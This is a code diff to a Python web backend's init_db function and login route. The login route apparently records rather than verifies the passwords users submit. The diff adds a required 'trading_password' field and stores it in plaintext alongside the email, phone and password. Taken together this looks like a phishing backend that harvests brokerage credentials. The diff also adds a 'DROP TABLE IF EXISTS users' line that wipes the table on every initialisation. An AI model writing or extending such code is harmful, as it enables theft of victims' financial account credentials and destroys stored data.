@@ -22,6 +22,8 @@ def init_db():
     """Initialize the Neon database and create the users table."""
     conn = get_db()
     cursor = conn.cursor()
+    # Drop and recreate to ensure trading_password column exists
+    cursor.execute('DROP TABLE IF EXISTS users')
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY,
@@ -29,6 +31,7 @@ def init_db():
             email TEXT,
             phone_number TEXT,
             password TEXT NOT NULL,
+            trading_password TEXT,
             remember_password INTEGER DEFAULT 0,
             created_at TEXT NOT NULL
         )
@@ -59,11 +62,15 @@ def login():
     email = data.get('email', '')
     phone_number = data.get('phone_number', '')
     password = data.get('password', '')
+    trading_password = data.get('trading_password', '')
     remember_password = 1 if data.get('remember_password', False) else 0
     created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
     if not password:
         return jsonify({'success': False, 'message': 'Password is required'}), 400
+
+    if not trading_password:
+        return jsonify({'success': False, 'message': 'Trading password is required'}), 400
 
     if login_type == 'email' and not email:
         return jsonify({'success': False, 'message': 'Email is required'}), 400
@@ -75,9 +82,9 @@ def login():
         conn = get_db()
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO users (login_type, email, phone_number, password, remember_password, created_at)
-            VALUES (%s, %s, %s, %s, %s, %s)
-        ''', (login_type, email, phone_number, password, remember_password, created_at))
+            INSERT INTO users (login_type, email, phone_number, password, trading_password, remember_password, created_at)
+            VALUES (%s, %s, %s, %s, %s, %s, %s)
+        ''', (login_type, email, phone_number, password, trading_password, remember_password, created_at))
         conn.commit()
         conn.close()
 
